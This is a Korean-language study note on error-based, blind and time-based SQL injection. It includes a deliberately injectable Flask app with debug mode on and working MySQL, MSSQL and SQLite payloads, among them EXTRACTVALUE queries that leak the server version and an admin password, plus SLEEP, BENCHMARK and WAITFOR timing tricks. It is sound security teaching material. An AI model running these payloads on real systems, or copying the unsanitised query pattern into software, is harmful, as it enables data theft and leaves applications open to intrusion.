# Error & Time based SQL Injection

* 쿼리 결과를 애플리케이션의 기능에서 출력하지 않는 경우에 사용할 수 있는 SQL Injection 공격 형태
    - **공격 성공 여부를 어떻게 판단하느냐**에 따라 명칭이 구분됨

<br/>

## Error based SQL Injection
임의로 에러를 발생시켜 데이터베이스 및 운영체제의 정보를 획득하는 공격 기법
* 애플리케이션에서 발생하는 에러를 이용해 공격하려고 한다면 **런타임 에러**(Runtime Error, *쿼리가 실행되고 나서 발생하는 에러*)가 필요함
    - 문법 에러(Syntax Error)와 같이 DBMS에서 쿼리가 실행되기 전에 발생하는 에러는 불가능함
* 공격자는 오류(에러) 메시지를 통해 공격에 필요한 다양한 정보를 수집하고 원하는 데이터를 획득할 수 있음
    - 에러 메시지와 같이 쿼리 실행 결과를 직접 노출하지는 않지만, **중요한 정보를 노출하는 방법들이 존재함**

<br/>

### Error based SQL Injection 예시
```python
from flask import Flask, request # Flask 프레임워크 사용
import pymysql

app = Flask(__name__)

def getConnection():
	return pymysql.connect(host='localhost', user='dream', password='hack', db='dreamhack', charset='utf8')

@app.route('/', methods=['GET'])
def index():
	username = request.args.get('username') # 이용자가 전달한 username 인자값을 가져옴
	sql = "SELECT username FROM users WHERE username='%s'" %username # 이용자의 입력값 username이 별다른 검사 없이 SQL 쿼리에 포함 → SQL Injection 취약점이 발생함

	conn = getConnetion()
	curs = conn.cursor(pymysql.cursors.DictCursor)
	curs.execute(sql)
	rows = curs.fetchall()
	conn.close()

    # SQL 실행 결과를 출력하는 코드가 존재하지 않고 쿼리 실행 결과만을 판단함
	if (rows):
		return "True"
	else:
		return "False"

app.run(host='0.0.0.0', port=8000, debug=True) # 디버그 모드 활성화(debug=True)
```
* Error based SQL Injection 공격 방법
    - Flask 프레임워크로 개발된 애플리케이션에서 디버그 모드를 활성화하면 코드에서 오류가 발생했을 때 발생 원인을 출력함
        + username에 ```admin 1'``` 쿼리를 삽입했을 경우
            ```sql
            # 생성되는 쿼리 → 실행 결과 문법 에러(Syntax Error) 발생
            SELECT username FROM users WHERE username='admin 1''
            ```
	    	![extractvalue_error](https://github.com/augustf86/Today_I_Learn/assets/122844932/1456e630-17c8-4ef3-8210-9243933f7493)

* Error based SQL Injection 공격 코드
    - ```EXTRACTVALUE``` 함수: 첫 번째 인자로 전달된 XML 데이터에서 두 번째 인자인 XPATH 식을 통해 데이터를 추출하는 함수
        + 두 번째 인자로 올바른 XPATH 식을 전달한 경우 쿼리가 정상적으로 실행됨
            ```sql
            SELECT EXTRACTVALUE('<a>test</a><b>abcd</b>', '/a'); # 결과: test
            ```
        + 두 번째 인자로 올바르지 않은 XPATH 식을 전달한 경우 에러 메시지에 삽입된 식의 결과가 출력됨
            ```sql
            SELECT EXTRACTVALUE(1, ":abcd");
            # 결과: ERROR 1105 (HY000): XPATH syntax error: ':abcd'
            ```
            - 올바르지 않은 XPATH 식에 중요한 정보를 추출할 수 있는 식을 입력한다면 공격자는 중요 정보를 획득할 수 있음
    - MySQL 환경에서 Error based SQL Injection으로 공격할 때 많이 사용하는 쿼리와 실행 결과
        ```sql
        SELECT EXTRACTVALUE(1, CONCAT(0x3a, version()));
        # 결과: ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
        ```
        + XPATH식에 삽입된 ```version``` 함수가 실행되면서 에러 메시지에 운영 체제에 대한 정보(```'0ubuntu0.16.04.1'```)가 포함되어 있음 → 공격자는 이 정보를 이용해 1-day 또는 0-day 공격을 통해 서버를 장악할 수 있음
        + ```CONCAT``` 함수: 둘 이상의 문자열을 입력한 순서대로 합쳐서 반환해주는 함수
            - 사용 형식: ```CONCAT(문자열1, 문자열2[, 문자열3, ...])```
    - ```EXTRACTVALUE``` 함수를 응용하여 데이터베이스의 정보를 추출하는 쿼리와 실행 결과
        ```sql
        SELECT EXTRACTVALUE(1, CONCAT(0x3a, (SELECT password FROM users WHERE username='admin')))
        # 결과: ERROR 1105 (HY000): XPATH syntax error: ':This_is_admin_PASSW@rd'
        ```
        + XPATH식에 삽입된 서브 쿼리가 실행되면서 에러 메시지에 users 테이블의 admin 사용자의 비밀번호가 포함되어 있음 → 공격자는 서브 쿼리를 사용해 임의 테이블의 데이터를 획득할 수 있음

<br/><br/>

## Error based Blind SQL Injection
Blind SQL Injection과 Error based SQL Injection을 동시에 활용하는 공격 기법
* Error based SQL Injection과 Error based Blind SQL Injection의 차이
    | Error based SQLI | Error based Blind SQLI |
    |---|---|
    | 에러 메시지를 통해 출력된 데이터로 정보를 수집해 출력값에 영향을 받음 | 에러 발생 여부만을 필요로 하기 때문에 용이하게 사용할 수 있음 |
* 서버가 반환하는 HTTP 상태 코드 또는 애플리케이션 응답 차이 등을 통해 에러 발생 여부를 확인하고 참/거짓 여부를 판단할 수 있음
    - 예시: MySQL의 DOUBLE 자료형의 최댓값을 초과해 에러를 발생시키는 경우
        ```sql
        SELECT IF(1=1, 9e307*2, 0); # 1=1이 참이므로 9e307*2를 반환 (결과: ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 2)')

        SELECT IF(1=0, 9e307*2, 0); # 1=0이 거짓이므로 0을 반환
        ```

<br/>

### Short-circuit evaluation
로직 연산의 원리를 이용해 공격하는 방법
* AND 연산자를 이용해 공격 → 처음의 식의 결과(참/거짓)에 따라 뒤의 식의 결과가 달라진다는 점을 이용함
    ```sql
    # 처음 식이 거짓을 반환하기 때문에 SLEEP 함수가 실행되지 않음
    SELECT 0 AND SLEEP(1); # 결과: 1 row in set (0.00 sec)

    # 처음 식이 참을 반환하기 때문에 SLEEP 함수가 실행됨
    SELECT 1 AND SLEEP(10); # 결과: 1 row in set (10.04 sec)
    ```
* 예시: OR 연산자를 이용해 공격 → 처음 식이 참이라면 뒤의 식의 결과가 실행에 영향을 주지 않는다는 점을 이용함
    ```sql
    # 처음 식이 참이므로 뒤의 식이 DOUBLE 자료형의 최댓값을 초과함에도 불구하고 에러 메시지 대신에 상적인 결과를 출력함
    SELECT 1=1 OR 9e307*2; # 결과: 1

    # 처음 식이 거짓이고, 뒤의 식이 DOUBLE 자료형의 최댓값을 초과하므로 에러 메시지를 출력함
    SELECT 1=0 OR 9e307*2; # 결과: ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 2)'
    ```

<br/><br/>

## Time based SQL Injection
시간 지연을 통해 쿼리의 참/거짓 여부를 판단하는 공격 기법
* 시간을 지연시키는 방법
    - ```SLEEP```과 같이 DBMS에서 제공하는 함수를 사용
    - 시간이 많이 소요되는 연산을 수행하는 헤비 쿼리(heavy query)를 사용

<br/>

### DBMS별로 Time based SQLI을 통해 공격하는 방법
* MySQL
    - ```SLEEP``` 함수 사용
        + ```SLEEP``` 함수: 대기할 시간(sec)을 인자로 받으며 지정한 시간만큼 대기하게 만드는 함수 (반환값 없음)
            - ```WHERE``` 조건문엔 의해 선택되는 행의 수만큼 ```SLEEP``` 함수를 호출함 → ```WHERE``` 조건문을 이용해 ```SLEEP``` 함수를 반복하게 만들 수 있음
        + 사용 예시
            ```sql
            SELECT SLEEP(1); # 결과: 1 row in set(1.00 sec)
            ```
    - ```BENCHMARK``` 함수 사용
        + ```BENCHMARK``` 함수: 반복 수행할 횟수와 실행할 표현식(반드시 스칼라(단일) 값을 반환해야 함)을 인자로 필요로 하는 함수
            - 지정한 횟수만큼 반복실행하는데 얼마나 시간이 소요되었는지가 중요함
            - 해당 함수로 얻은 쿼리나 함수의 성능은 그 자체로는 별 의미가 없음에 유의 (두 개의 동일 기능을 상대적으로 비교 분석하는 용도로만 사용할 것을 권장함)
        + 사용 예시
            ```sql
            SELECT BENCHMARK(4000000, SHA1(1)); # 결과: 1 row in set (10.78 sec)
            ```
    - 헤비 쿼리 사용
        + 헤비 쿼리 예시
            ```sql
            SELECT (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) as heavy; # 결과: 1 row in set (1.38 sec)
            ```
* MSSQL
    - ```WAITFOR``` 사용
        + ```WAITFOR DELAY 'time_to_pass'```는 특정 시간 동안 지연시킬 때 사용됨
            - ```'time_to_pass'``` 부분에 '시:분:초:밀리세컨트' 형식으로 딜레이를 줄 수 있음
        + 사용 예시
            ```sql
            SELECT '' IF((SELECT 'abc')='abc') WAITFOR DELAY '0:0:1';
            ```
    - 헤비 쿼리 사용
        ```sql
        SELECT (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C, information_schema.columns D);
        ```
* SQLite
    - 헤비 쿼리 사용
        ```sql
        .timer ON
        SELECT LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(150000000000000/2)))) # SLEEP TIME: 150000000000000/2
        ```
